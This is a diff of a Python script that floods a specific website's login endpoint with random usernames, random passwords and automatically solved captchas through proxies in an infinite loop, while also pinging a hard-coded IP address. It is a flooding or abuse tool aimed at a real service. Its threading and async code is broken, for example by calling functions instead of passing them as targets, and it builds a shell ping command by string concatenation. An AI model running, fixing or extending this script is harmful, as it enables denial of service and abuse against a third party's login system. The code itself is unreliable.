@@ -16,6 +16,9 @@ print(
 
 
 class Console:
+
+    ip = "104.26.5.11"
+
     def captcha_solve():
         url = requests.get("https://entrar.in/login/login", proxies=proxy, timeout=5)
         soup = BS(url.content, features="html.parser")
@@ -34,37 +37,29 @@ class Console:
         return password
 
 
-def ping(ip):
-    os.system("ping " + ip)
+async def ping(ip):
+    await os.system("ping " + ip)
 
 
 def send_req():
     r = requests.Session()
-    ip = "104.26.5.11"
     url = "https://entrar.in/login/auth"
     user = Console.rand_gen_user()
     password = Console.rand_gen_pass()
     captcha = Console.captcha_solve()
     payload = {"username": user, "password": password, "captcha": captcha}
     req = r.post(url, data=bytes(json.dumps(payload), encoding="utf-8"), proxies=proxy, timeout=5)
-    asyncio.run(ping(ip))
     print(Fore.LIGHTYELLOW_EX, "Request Sent to ------->", req.url, "-", req.elapsed.total_seconds())
-
-
-threads = [
-    threading.Thread(target=send_req()),
-    threading.Thread(target=send_req()),
-    threading.Thread(target=send_req()),
-    threading.Thread(target=send_req()),
-    threading.Thread(target=send_req()),
-]
 
 
 def run():
     for _ in range(100):
-        t = threading.Thread(target=send_req())
-    t.start()
+        t1 = threading.Thread(target=send_req())
+        t2 = threading.Thread(target=ping(Console.ip))
+    t1.start()
+    t2.start()
 
 
-while True:
-    run()
+if __name__ == "__main__":
+    while True:
+        run()
